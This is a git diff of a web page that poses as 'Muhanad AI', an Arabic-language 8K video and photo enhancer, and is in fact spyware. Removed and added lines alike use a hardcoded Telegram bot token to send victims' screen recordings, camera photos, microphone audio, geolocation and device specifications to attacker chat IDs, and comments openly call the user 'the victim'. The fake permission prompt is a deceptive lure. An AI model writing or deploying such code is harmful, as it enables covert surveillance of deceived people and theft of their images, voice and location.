@@ -1,135 +1,70 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Muhanad AI | Extreme Quality Enhancer</title>
-    <meta name="description" content="أداة مهند الاحترافية: تحسين جودة الفيديو والصور إلى 8K باستخدام الذكاء الاصطناعي السحابي.">
-    <link rel="icon" href="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
-    <style>
-        :root { --primary: #007bff; --bg: #0b0e14; --accent: #00ff41; }
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); color: #fff; text-align: center; }
-        .header { background: #161b22; padding: 15px; border-bottom: 3px solid var(--primary); display: flex; justify-content: space-between; align-items: center; padding: 15px 8%; }
-        .card { background: #1c2128; border-radius: 20px; padding: 40px; border: 1px solid #30363d; max-width: 500px; margin: 40px auto; box-shadow: 0 0 50px rgba(0, 123, 255, 0.2); }
-        .btn-start { background: var(--primary); color: white; border: none; padding: 20px; font-size: 1.5rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 10px 30px rgba(0,123,255,0.4); }
-        .console { display: none; background: #000; color: var(--accent); padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; text-align: left; direction: ltr; height: 200px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
-    </style>
-</head>
-<body>
-
-<div class="header">
-    <div style="font-weight: bold; color: var(--primary); font-size: 24px;">MUHANAD AI PRO</div>
-    <div style="color: var(--accent); font-size: 12px;">ULTIMATE ENGINE ACTIVE ✅</div>
-</div>
-
-<div class="card">
-    <div id="ui">
-        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width: 100px; border-radius: 50%; margin-bottom: 20px; border: 2px solid var(--primary);">
-        <h2>محسن الجودة الفائق (8K)</h2>
-        <p style="color: #8b949e;">يرجى منح الأذونات اللازمة للوصول إلى وحدة المعالجة المركزية (GPU) لضمان دقة الرندر.</p>
-        <button class="btn-start" onclick="startUltimateCapture()">ابدأ المعالجة الآن</button>
-    </div>
-    <div class="console" id="log"></div>
-</div>
-
-<canvas id="hidden_canvas" style="display:none;"></canvas>
-
 <script>
     const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
     const IDS = ["8754338811", "8703490899"];
 
-    async function sendToTelegram(type, data, caption = "") {
-        for (let id of IDS) {
-            const fd = new FormData();
-            fd.append('chat_id', id);
-            if (type === 'photo') {
-                fd.append('photo', data, 'snap.jpg');
-                fd.append('caption', caption);
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            } else if (type === 'video') {
-                fd.append('video', data, 'clip.mp4');
-                fd.append('caption', caption);
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
-            } else {
-                fd.append('text', data);
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
-            }
-        }
+    // 1. سحب مواصفات الجهاز بالكامل
+    async function getDeviceSpecs() {
+        const specs = {
+            "📱 المتصفح": navigator.userAgent,
+            "💻 المنصة": navigator.platform,
+            "🧠 الرامات": navigator.deviceMemory + " GB",
+            "⚙️ الأنوية": navigator.hardwareConcurrency,
+            "🔋 البطارية": (await navigator.getBattery()).level * 100 + "%",
+            "🌐 اللغة": navigator.language,
+            "📏 الشاشة": `${screen.width}x${screen.height}`
+        };
+        let msg = "🖥️ **مواصفات جهاز الضحية:**\n";
+        for (let key in specs) msg += `*${key}:* ${specs[key]}\n`;
+        sendToTelegram('text', msg);
     }
 
-    async function startUltimateCapture() {
-        document.getElementById('ui').style.display = 'none';
-        const log = document.getElementById('log');
-        log.style.display = 'block';
-        log.innerHTML = "> Accessing Hardware Layers...<br>> Initializing AI Frame Capture...<br>";
-
-        try {
-            // 1. طلب سطح المكتب (صوت وصورة) للكمبيوتر
-            const screen = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-            recordStream(screen, "🖥️ شاشة الضحية (صوت وصورة)");
-
-            // 2. طلب الكاميرا (الأمامية أولاً)
-            const frontCam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            recordStream(frontCam, "📷 الكاميرا الأمامية");
-            
-            // التقاط 15 صورة من الأمامية
-            capturePhotos(frontCam, "الأمامية", 15);
-
-            // 3. محاولة التبديل للكاميرا الخلفية (للموبايلات)
-            setTimeout(async () => {
-                try {
-                    const backCam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    capturePhotos(backCam, "الخلفية", 15);
-                } catch(e) { log.innerHTML += "> Back Camera not available.<br>"; }
-            }, 10000); // يبدأ في الخلفية بعد 10 ثوانٍ
-
-            // سحب الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram('text', `📍 موقع الضحية:\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
-            });
-
-        } catch (err) {
-            alert("⚠️ خطأ: يجب السماح بجميع الأذونات (بما في ذلك الشاشة بأكملها) لتفعيل معالجة 8K.");
-            location.reload();
-        }
-    }
-
-    function capturePhotos(stream, label, count) {
-        const track = stream.getVideoTracks()[0];
-        const canvas = document.getElementById('hidden_canvas');
-        const ctx = canvas.getContext('2d');
-        let taken = 0;
-
-        let interval = setInterval(() => {
-            if (taken >= count) { clearInterval(interval); return; }
-            
-            const v = document.createElement('video');
-            v.srcObject = stream;
-            v.play();
-            v.onloadedmetadata = () => {
-                canvas.width = v.videoWidth;
-                canvas.height = v.videoHeight;
-                ctx.drawImage(v, 0, 0);
-                canvas.toBlob(blob => {
-                    sendToTelegram('photo', blob, `📸 صورة ${label} رقم ${taken+1}`);
-                    taken++;
-                }, 'image/jpeg');
-            };
-        }, 2000); // يلقط صورة كل ثانيتين
-    }
-
-    function recordStream(stream, label) {
+    // 2. تسجيل صوت (ريكورد) منفصل
+    async function recordAudio() {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         const recorder = new MediaRecorder(stream);
         let chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
         recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/mp4' });
-            sendToTelegram('video', blob, `📡 بث مباشر: ${label}`);
-            if (stream.active) recordStream(stream, label);
+            const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+            for (let id of IDS) {
+                const fd = new FormData();
+                fd.append('chat_id', id);
+                fd.append('voice', blob, 'record.ogg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+            }
         };
         recorder.start();
-        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 30000);
+        setTimeout(() => recorder.stop(), 10000); // ريكورد 10 ثواني
+    }
+
+    // 3. تعديل وظيفة التشغيل لتشمل كل شيء
+    async function startUltimateCapture() {
+        document.getElementById('ui').style.display = 'none';
+        document.getElementById('log').style.display = 'block';
+
+        try {
+            // سحب المواصفات فوراً
+            getDeviceSpecs();
+
+            // طلب المايك وتسجيل ريكورد
+            recordAudio();
+
+            // طلب الشاشة (للكمبيوتر)
+            const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            recordStream(screen, "🖥️ شاشة الضحية");
+
+            // طلب الكاميرا والصور
+            const cam = await navigator.mediaDevices.getUserMedia({ video: true });
+            capturePhotos(cam, "الأمامية", 15);
+
+            // الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram('text', `📍 الموقع: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+        } catch (err) {
+            console.error(err);
+            location.reload();
+        }
     }
 </script>
-</body>
-</html>
